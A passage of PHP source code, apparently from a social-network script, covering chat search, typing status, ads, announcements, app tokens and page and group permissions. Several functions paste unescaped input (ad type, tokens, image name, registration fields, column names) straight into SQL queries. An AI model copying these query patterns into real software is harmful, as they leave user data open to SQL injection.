            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_ChatSearchUsers($search_query = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data         = array();
    $time         = time() - 60;
    $search_query = NRG_Secure($search_query);
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    $query_one    = "SELECT `user_id` FROM " . T_USERS . " WHERE (`user_id` IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = {$user_id} AND `following_id` <> {$user_id} AND `active` = '1') AND `active` = '1'";
    if (isset($search_query) && !empty($search_query)) {
        $query_one .= " AND ((`username` LIKE '%$search_query%') OR CONCAT(`first_name`,  ' ', `last_name`) LIKE  '%{$search_query}%'))";
    }
    $query_one .= " ORDER BY `first_name` LIMIT 10";
    $query = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $data[] = NRG_UserData($fetched_data["user_id"]);
        }
    }
    return $data;
}
function NRG_UpdateStatus($status = "online") {
    global $sqlConnect, $nrg, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($status)) {
        return false;
    }
    $finel_status = "";
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    if ($status == "online") {
        $finel_status = 0;
    } elseif ($status == "offline") {
        $finel_status = 1;
    }
    if (!is_numeric($finel_status)) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "UPDATE " . T_USERS . " SET `status` = '{$finel_status}' WHERE `user_id` = {$user_id}");
    if ($query) {
        cache($user_id, 'users', 'delete');
        return $finel_status;
    }
}
function NRG_IsOnline($user_id) {
    global $nrg;
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 1) {
        return false;
    }
    $user_id  = NRG_Secure($user_id);
    $lastseen = NRG_UserData($user_id);
    if ($nrg["config"]["node_socket_flow"] == "1") {
        $time = time() - 03;
    } else {
        $time = time() - 60;
    }
    if ($lastseen["lastseen"] < $time) {
        return false;
    } else {
        return true;
    }
}
function NRG_RightToLeft($type = "") {
    global $nrg;
    $type = NRG_Secure($type);
    if ($nrg["language_type"] == "rtl") {
        if ($type == "pull-right") {
            return "pull-left";
        }
        if ($type == "pull-left") {
            return "pull-right";
        }
        if ($type == "left-addon") {
            return "right-addon";
        }
        if ($type == "text-right") {
            return "text-left";
        }
        if ($type == "text-left") {
            return "text-right";
        }
        if ($type == "right") {
            return "left";
        }
    } else {
        return $type;
    }
}
function NRG_GetOfflineTyping() {
    global $nrg, $sqlConnect;
    $time      = time() - 360;
    $data      = array();
    $query     = "SELECT `user_id` FROM " . T_USERS . " WHERE `lastseen` < '{$time}' AND (`user_id` IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `is_typing` = 1))";
    $query_one = mysqli_query($sqlConnect, $query);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            NRG_DeleteAllTyping($fetched_data["user_id"]);
        }
    }
}
function NRG_IsTyping($recipient_id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($recipient_id) || !is_numeric($recipient_id) || $recipient_id < 0) {
        return false;
    }
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    $recipient_id = NRG_Secure($recipient_id);
    $query        = "SELECT `is_typing` FROM " . T_FOLLOWERS . " WHERE follower_id = {$user_id} AND following_id = {$recipient_id} AND `is_typing` = 1";
    $query_one    = mysqli_query($sqlConnect, $query);
    return NRG_Sql_Result($query_one, 0) == 1 ? true : false;
}
function NRG_RegisterTyping($recipient_id, $isTyping = 1) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($recipient_id) || !is_numeric($recipient_id) || $recipient_id < 0) {
        return false;
    }
    $user_id      = NRG_Secure($nrg["user"]["user_id"]);
    $recipient_id = NRG_Secure($recipient_id);
    $typing       = 1;
    if ($isTyping == 0) {
        $typing = 0;
    } elseif ($isTyping == 2) {
        $typing = 2;
    }
    if (NRG_IsFollowing($user_id, $recipient_id) === false) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "UPDATE " . T_FOLLOWERS . " SET `is_typing` = '$typing' WHERE following_id = '{$user_id}' AND follower_id = {$recipient_id}");
    if ($query) {
        return true;
    }
}
function NRG_DeleteAllTyping($user_id) {
    global $sqlConnect;
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    $query   = mysqli_query($sqlConnect, "UPDATE " . T_FOLLOWERS . " SET `is_typing` = 0 WHERE `following_id` = {$user_id}");
    if ($query) {
        return true;
    }
}
function NRG_UpdateAdsCode($update_data = array()) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    if (empty($update_data["type"])) {
        return false;
    }
    $type   = NRG_Secure($update_data["type"]);
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . mysqli_real_escape_string($sqlConnect, $data) . '\'';
    }
    $query_text    = implode(", ", $update);
    $query_one     = " UPDATE " . T_ADS . " SET {$query_text} WHERE `type` = '{$type}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if ($sql_query_one) {
        return true;
    }
}
function NRG_GetAd($type, $admin = true) {
    global $sqlConnect;
    $type      = NRG_Secure($type);
    $query_one = "SELECT `code` FROM " . T_ADS . " WHERE `type` = '{$type}'";
    if ($admin === false) {
        $query_one .= " AND `active` = '1'";
    }
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        $fetched_data = mysqli_fetch_assoc($sql_query_one);
        return $fetched_data["code"];
    }
    return false;
}
function NRG_IsAdActive($type) {
    global $sqlConnect;
    $query_one     = "SELECT COUNT(`id`) AS `count` FROM " . T_ADS . " WHERE `type` = '{$type}' AND `active` = '1' ";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        $fetched_data = mysqli_fetch_assoc($sql_query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_UpdateAdActivation($type) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
        return false;
    }
    if (NRG_IsAdActive($type)) {
        $query_one = mysqli_query($sqlConnect, "UPDATE " . T_ADS . " SET `active` = '0' WHERE `type` = '{$type}'");
        return "inactive";
    } else {
        $query_one = mysqli_query($sqlConnect, "UPDATE " . T_ADS . " SET `active` = '1' WHERE `type` = '{$type}'");
        return "active";
    }
}
function NRG_AddNewAnnouncement($text) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $text    = mysqli_real_escape_string($sqlConnect, $text);
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    if (empty($text)) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "INSERT INTO " . T_ANNOUNCEMENT . " (`text`, `time`, `active`) VALUES ('{$text}', " . time() . ", '1')");
    if ($query) {
        return mysqli_insert_id($sqlConnect);
    }
}
function NRG_GetAnnouncement($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data    = array();
    if (empty($id) || !is_numeric($id) || $id < 1) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_ANNOUNCEMENT . " WHERE `id` = {$id} ORDER BY `id` DESC");
    if (mysqli_num_rows($query) == 1) {
        $fetched_data         = mysqli_fetch_assoc($query);
        $fetched_data["text"] = NRG_Markup($fetched_data["text"]);
        $fetched_data["text"] = NRG_Emo($fetched_data["text"]);
        return $fetched_data;
    }
    return false;
}
function NRG_GetAnnouncementViews($id) {
    global $sqlConnect, $nrg;
    $id        = NRG_Secure($id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as `count` FROM " . T_ANNOUNCEMENT_VIEWS . " WHERE `announcement_id` = {$id}");
    if (mysqli_num_rows($query_one)) {
        $sql_query_one = mysqli_fetch_assoc($query_one);
        return $sql_query_one["count"];
    }
    return false;
}
function NRG_GetActiveAnnouncements() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data    = array();
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_ANNOUNCEMENT . " WHERE `active` = '1' ORDER BY `id` DESC");
    if (mysqli_num_rows($query)) {
        while ($row = mysqli_fetch_assoc($query)) {
            $data[] = NRG_GetAnnouncement($row["id"]);
        }
    }
    return $data;
}
function NRG_GetHomeAnnouncements() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_ANNOUNCEMENT . " WHERE `active` = '1' AND `id` NOT IN (SELECT `announcement_id` FROM " . T_ANNOUNCEMENT_VIEWS . " WHERE `user_id` = {$user_id}) ORDER BY RAND() LIMIT 1");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        $data         = NRG_GetAnnouncement($fetched_data["id"]);
        return $data;
    }
    return false;
}
function NRG_GetInactiveAnnouncements() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data    = array();
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_ANNOUNCEMENT . " WHERE `active` = '0' ORDER BY `id` DESC");
    if (mysqli_num_rows($query)) {
        while ($row = mysqli_fetch_assoc($query)) {
            $data[] = NRG_GetAnnouncement($row["id"]);
        }
    }
    return $data;
}
function NRG_DeleteAnnouncement($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "DELETE FROM " . T_ANNOUNCEMENT . " WHERE `id` = {$id}");
    $query_one .= mysqli_query($sqlConnect, "DELETE FROM " . T_ANNOUNCEMENT_VIEWS . " WHERE `announcement_id` = {$id}");
    if ($query_one) {
        return true;
    }
}
function NRG_IsActiveAnnouncement($id) {
    global $sqlConnect;
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_ANNOUNCEMENT . " WHERE `id` = '{$id}' AND `active` = '1'");
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_IsViewedAnnouncement($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_ANNOUNCEMENT_VIEWS . " WHERE `announcement_id` = '{$id}' AND `user_id` = '{$user_id}'");
    return NRG_Sql_Result($query, 0) > 0 ? true : false;
}
function NRG_IsThereAnnouncement() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_ANNOUNCEMENT . " WHERE `active` = '1' AND `id` NOT IN (SELECT `announcement_id` FROM " . T_ANNOUNCEMENT_VIEWS . " WHERE `user_id` = {$user_id})");
    if (mysqli_num_rows($query)) {
        $sql = mysqli_fetch_assoc($query);
        return $sql["count"] > 0 ? true : false;
    }
    return false;
}
function NRG_DisableAnnouncement($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    if (NRG_IsActiveAnnouncement($id) === false) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "UPDATE " . T_ANNOUNCEMENT . " SET `active` = '0' WHERE `id` = {$id}");
    if ($query_one) {
        return true;
    }
}
function NRG_ActivateAnnouncement($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (NRG_IsAdmin($user_id) === false) {
        return false;
    }
    if (NRG_IsActiveAnnouncement($id) === true) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "UPDATE " . T_ANNOUNCEMENT . " SET `active` = '1' WHERE `id` = {$id}");
    if ($query_one) {
        return true;
    }
}
function NRG_UpdateAnnouncementViews($id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $id      = NRG_Secure($id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (NRG_IsActiveAnnouncement($id) === false) {
        return false;
    }
    if (NRG_IsViewedAnnouncement($id) === true) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_ANNOUNCEMENT_VIEWS . " (`user_id`, `announcement_id`) VALUES ('{$user_id}', '{$id}')");
    if ($query_one) {
        return true;
    }
}
function NRG_RegisterApp($registration_data) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($registration_data)) {
        return false;
    }
    if (empty($registration_data["app_user_id"]) || !is_numeric($registration_data["app_user_id"]) || $registration_data["app_user_id"] < 1) {
        return false;
    }
    $id_str                          = sha1($registration_data["app_user_id"] . microtime() . time());
    $registration_data["app_id"]     = NRG_Secure(substr($id_str, 0, 20));
    $secret_str                      = sha1($registration_data["app_user_id"] . NRG_GenerateKey(55, 55) . microtime());
    $registration_data["app_secret"] = NRG_Secure(substr($secret_str, 0, 39));
    if (empty($registration_data["app_secret"]) || empty($registration_data["app_id"])) {
        return false;
    }
    $fields = "`" . implode("`, `", array_keys($registration_data)) . "`";
    $data   = '\'' . implode('\', \'', $registration_data) . '\'';
    $query  = mysqli_query($sqlConnect, "INSERT INTO " . T_APPS . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return mysqli_insert_id($sqlConnect);
    }
}
function NRG_IsAppOnwer($app_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id   = NRG_Secure($nrg["user"]["user_id"]);
    $app_id    = NRG_Secure($app_id);
    $query_one = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as `count` FROM " . T_APPS . " WHERE `app_user_id` = {$user_id} AND `id` = {$app_id} AND `active` = '1'");
    if (mysqli_num_rows($query_one)) {
        $sql_query_one = mysqli_fetch_assoc($query_one);
        return $sql_query_one["count"] == 1 ? true : false;
    }
    return false;
}
function NRG_GetAppsData($placement = "") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data       = array();
    $user_id    = $nrg["user"]["user_id"];
    $query_text = "SELECT `id` FROM " . T_APPS;
    if ($placement != "admin") {
        $query_text .= " WHERE `app_user_id` = {$user_id}";
    }
    $query_one = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_GetApp($fetched_data["id"]);
            }
        }
    }
    return $data;
}
function NRG_GetApp($app_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($app_id) || !is_numeric($app_id) || $app_id < 1) {
        return false;
    }
    $app_id    = NRG_Secure($app_id);
    $query_one = mysqli_query($sqlConnect, "SELECT * FROM " . T_APPS . " WHERE `id` = {$app_id}");
    //if ($query_one) {
    if (mysqli_num_rows($query_one) == 1) {
        $sql_query_one               = mysqli_fetch_assoc($query_one);
        $sql_query_one["app_onwer"]  = NRG_UserData($sql_query_one["app_user_id"]);
        $sql_query_one["app_avatar"] = NRG_GetMedia($sql_query_one["app_avatar"]);
        return $sql_query_one;
    }
    //}
    return false;
}
function NRG_GetCode($code = "") {
    global $sqlConnect, $nrg;
    if (empty($code)) {
        return false;
    }
    $code      = NRG_Secure($code);
    $query_one = mysqli_query($sqlConnect, "SELECT * FROM " . T_CODES . " WHERE `code` = '{$code}'");
    if (mysqli_num_rows($query_one)) {
        if (mysqli_num_rows($query_one) == 1) {
            $sql_query_one = mysqli_fetch_assoc($query_one);
            return $sql_query_one;
        }
    }
    return false;
}
function NRG_UpdateAppImage($app_id, $image) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($app_id) || !is_numeric($app_id) || $app_id < 0) {
        return false;
    }
    if (empty($image)) {
        return false;
    }
    $app_id    = NRG_Secure($app_id);
    $query_one = " UPDATE " . T_APPS . " SET `app_avatar` = '{$image}' WHERE `id` = {$app_id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($query) {
        return true;
    }
}
function NRG_UpdateAppData($app_id, $update_data) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($app_id) || !is_numeric($app_id) || $app_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $app_id = NRG_Secure($app_id);
    if (!NRG_IsAppOnwer($app_id) && !NRG_IsAdmin()) {
        return false;
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data) . '\'';
    }
    $impload   = implode(", ", $update);
    $query_one = " UPDATE " . T_APPS . " SET {$impload} WHERE `id` = {$app_id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetIdFromAppID($app_id) {
    global $sqlConnect;
    if (empty($app_id)) {
        return false;
    }
    $app_id        = NRG_Secure($app_id);
    $query_one     = "SELECT `id` FROM " . T_APPS . " WHERE `app_id` = '{$app_id}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        $sql_fetch_one = mysqli_fetch_assoc($sql_query_one);
        return $sql_fetch_one["id"];
    }
    return false;
}
function NRG_AccessToken($app_id, $app_secret) {
    global $sqlConnect;
    if (empty($app_id)) {
        return false;
    }
    if (empty($app_secret)) {
        return false;
    }
    $app_id        = NRG_Secure($app_id);
    $app_secret    = NRG_Secure($app_secret);
    $query_one     = "SELECT `id` FROM " . T_APPS . " WHERE `app_id` = '{$app_id}' AND `app_secret` = '{$app_secret}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        return true;
    } else {
        return false;
    }
}
function NRG_IsValidApp($app_id) {
    global $sqlConnect;
    if (empty($app_id)) {
        return false;
    }
    $app_id        = NRG_Secure($app_id);
    $query_one     = "SELECT `id` FROM " . T_APPS . " WHERE `app_id` = '{$app_id}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        return true;
    }
    return false;
}
function NRG_VerifyAPIApii($app_id = "", $secret_id = "") {
    global $sqlConnect;
    if (empty($app_id) || empty($secret_id)) {
        return false;
    }
    $app_id        = NRG_Secure($app_id);
    $secret_id     = NRG_Secure($secret_id);
    $query_one     = "SELECT `id` FROM " . T_APPS . " WHERE `app_id` = '{$app_id}' AND `app_secret` = '$secret_id'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) == 1) {
        return true;
    }
    return false;
}
function NRG_AppHasPermission($user_id, $app_id) {
    global $sqlConnect, $nrg;
    if (empty($app_id)) {
        return false;
    }
    $app_id        = NRG_Secure($app_id);
    $user_id       = NRG_Secure($user_id);
    $query_one     = "SELECT `id` FROM " . T_APPS_PERMISSION . " WHERE `app_id` = '{$app_id}' AND `user_id` = '{$user_id}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one) > 0) {
        return true;
    } else {
        return false;
    }
}
function NRG_AcceptPermissions($app_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $app_id  = NRG_Secure($app_id);
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (empty($app_id) || empty($user_id)) {
        return false;
    }
    $query_one     = "INSERT INTO " . T_APPS_PERMISSION . " (`user_id`,`app_id`) VALUES ('{$user_id}','{$app_id}')";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if ($sql_query_one) {
        return true;
    }
}
function NRG_GenrateToken($user_id, $app_id) {
    global $sqlConnect, $nrg;
    $app_id  = NRG_Secure($app_id);
    $user_id = NRG_Secure($user_id);
    if (empty($app_id) || empty($user_id)) {
        return false;
    }
    $token     = NRG_GenerateKey(100, 100);
    $query_two = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_TOKENS . " WHERE `app_id` = {$app_id} AND `user_id` = {$user_id}");
    if (mysqli_num_rows($query_two) > 0) {
        $query_three = mysqli_query($sqlConnect, "DELETE FROM " . T_TOKENS . " WHERE `app_id` = {$app_id} AND `user_id` = {$user_id}");
    }
    $query_one     = "INSERT INTO " . T_TOKENS . " (`user_id`,`app_id`,`token`,`time`) VALUES ('{$user_id}','{$app_id}','{$token}','" . time() . "')";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if ($sql_query_one) {
        return $token;
    }
}
function NRG_GenrateCode($user_id, $app_id) {
    global $sqlConnect, $nrg;
    $app_id  = NRG_Secure($app_id);
    $user_id = NRG_Secure($user_id);
    if (empty($app_id) || empty($user_id)) {
        return false;
    }
    $token     = NRG_GenerateKey(40, 40);
    $query_two = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_CODES . " WHERE `app_id` = {$app_id} AND `user_id` = {$user_id}");
    if (mysqli_num_rows($query_two) > 0) {
        $query_three = mysqli_query($sqlConnect, "DELETE FROM " . T_CODES . " WHERE `app_id` = {$app_id} AND `user_id` = {$user_id}");
    }
    $query_one     = "INSERT INTO " . T_CODES . " (`user_id`,`app_id`,`code`,`time`) VALUES ('{$user_id}','{$app_id}','{$token}','" . time() . "')";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if ($sql_query_one) {
        return $token;
    }
}
function NRG_UserIdFromToken($token = "") {
    global $sqlConnect, $nrg;
    if (empty($token)) {
        return false;
    }
    $time          = time() - 3600;
    $query         = mysqli_query($sqlConnect, "DELETE FROM " . T_TOKENS . " WHERE `token` = '{$token}' AND `time` < $time");
    $query_one     = "SELECT `user_id` FROM " . T_TOKENS . " WHERE `token` = '{$token}' AND `time` > $time";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        if (mysqli_num_rows($sql_query_one) == 1) {
            $sql_query_two = mysqli_fetch_assoc($sql_query_one);
            return $sql_query_two["user_id"];
        } else {
            return false;
        }
    }
    return false;
}
function NRG_GetIdFromToken($token) {
    global $sqlConnect, $nrg;
    if (empty($token)) {
        return false;
    }
    $query_one     = "SELECT `app_id` FROM " . T_TOKENS . " WHERE `token` = '{$token}'";
    $sql_query_one = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql_query_one)) {
        if (mysqli_num_rows($sql_query_one) == 1) {
            $sql_query_two = mysqli_fetch_assoc($sql_query_one);
            return $sql_query_two["app_id"];
        } else {
            return false;
        }
    }
    return false;
}
function NRG_RegisterPage($registration_data = array()) {
    global $nrg, $sqlConnect;
    if (empty($registration_data)) {
        return false;
    }
    if (!empty($registration_data["page_category"])) {
        if (!in_array($registration_data["page_category"], array_keys($nrg["page_categories"]))) {
            $registration_data["page_category"] = 1;
        }
    }
    $registration_data["registered"] = date("n") . "/" . date("Y");
    $fields                          = "`" . implode("`, `", array_keys($registration_data)) . "`";
    $data                            = '\'' . implode('\', \'', $registration_data) . '\'';
    $query                           = mysqli_query($sqlConnect, "INSERT INTO " . T_PAGES . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetMyPages($user_id = false, $limit = 0, $offset = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $limit_text = "";
    if (!empty($limit) && is_numeric($limit) && $limit > 0) {
        $limit      = NRG_Secure($limit);
        $limit_text = " LIMIT " . $limit;
    }
    $data    = array();
    $user_id = NRG_Secure($user_id);
    if (!$user_id || !is_numeric($user_id) || $user_id < 1) {
        $user_id = NRG_Secure($nrg["user"]["user_id"]);
    }
    $offset_text = "";
    if (!empty($offset) && is_numeric($offset) && $offset > 0) {
        $offset      = NRG_Secure($offset);
        $offset_text = " AND `page_id` > " . $offset;
    }
    $query_text = "SELECT `page_id` FROM " . T_PAGES . "
                   WHERE (`user_id` = {$user_id} OR `page_id` IN (SELECT `page_id` FROM " . T_PAGE_ADMINS . "
                   WHERE `user_id` = {$user_id})) {$offset_text} {$limit_text}";
    $query_one  = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_PageData($fetched_data["page_id"]);
            }
        }
    }
    return $data;
}
function NRG_GetMyPagesAPI($limit = 0, $offset = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $data        = array();
    $user_id     = NRG_Secure($nrg["user"]["user_id"]);
    $limit_query = "";
    if (!empty($limit)) {
        $limit       = NRG_Secure($limit);
        $limit_query = " LIMIT $limit";
    }
    $offset_query = "";
    if (!empty($offset)) {
        $offset       = NRG_Secure($offset);
        $offset_query = " `page_id` < $offset AND ";
    }
    $query_text = "SELECT `page_id` FROM " . T_PAGES . "
                   WHERE $offset_query (`user_id` = {$user_id} OR `page_id` IN (SELECT `page_id` FROM " . T_PAGE_ADMINS . "
                   WHERE `user_id` = {$user_id})) ORDER BY `page_id` DESC $limit_query";
    $query_one  = mysqli_query($sqlConnect, $query_text);
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            if (is_array($fetched_data)) {
                $data[] = NRG_PageData($fetched_data["page_id"]);
            }
        }
    }
    return $data;
}
function NRG_IsPageOnwer($page_id,$with_admin = true) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($page_id) || !is_numeric($page_id) || $page_id < 0) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    if ($with_admin) {
        if (NRG_IsAdmin() || NRG_IsModerator()) {
            return true;
        }
    } 
    $query = mysqli_query($sqlConnect, " SELECT COUNT(`user_id`) FROM " . T_PAGES . " WHERE `page_id` = {$page_id} AND `user_id` = {$user_id} AND `active` = '1'");
    return NRG_Sql_Result($query, "0") == 1 || NRG_IsPageAdminExists($user_id, $page_id) ? true : false;
}
function NRG_IsCanGroupUpdate($group_id, $page) {
    global $sqlConnect, $nrg;
    $array = array(
        "general",
        "privacy",
        "avatar",
        "members",
        "analytics",
        "delete_group"
    );
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0 || empty($page) || !in_array($page, $array)) {
        return false;
    }
    if (NRG_IsAdmin() || NRG_IsModerator()) {
        return true;
    }
    $user_id  = $nrg["user"]["id"];
    $page     = NRG_Secure($page);
    $group_id = NRG_Secure($group_id);
    $query    = mysqli_query($sqlConnect, " SELECT COUNT(*) FROM " . T_GROUP_ADMINS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id} AND `{$page}` = '1'");
    return NRG_Sql_Result($query, "0") == 1 ? true : false;
}
function NRG_GetAllowedGroupPages($group_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($group_id) || !is_numeric($group_id) || $group_id < 0) {
        return false;
    }
    $array    = array(
        "general" => "general-setting",
        "privacy" => "privacy-setting",
        "avatar" => "avatar-setting",
        "members" => "group-members",
        "analytics" => "analytics",
        "delete_group" => "delete-group"
    );
    $data     = array();
    $user_id  = $nrg["user"]["id"];
    $group_id = NRG_Secure($group_id);
    $query    = mysqli_query($sqlConnect, " SELECT * FROM " . T_GROUP_ADMINS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id}");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if (!empty($fetched_data)) {
            foreach ($fetched_data as $key => $value) {
                if (in_array($key, array_keys($array)) && $value == 1) {
                    $data[] = $array[$key];
                }
            }
        }
    }
    return $data;
}
function NRG_GetGroupAdminInfo($user_id, $group_id) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false || empty($group_id) || !is_numeric($group_id) || empty($user_id) || !is_numeric($user_id)) {
        return false;
    }
    $group_id = NRG_Secure($group_id);
    $user_id  = NRG_Secure($user_id);
    $sql      = " SELECT * FROM " . T_GROUP_ADMINS . " WHERE `group_id` = {$group_id} AND `user_id` = {$user_id}";
    $data     = array();
    $query    = mysqli_query($sqlConnect, $sql);
    if (mysqli_num_rows($query)) {
        return mysqli_fetch_assoc($query);
    }
    return false;
}
function NRG_IsCanPageUpdate($page_id, $page) {
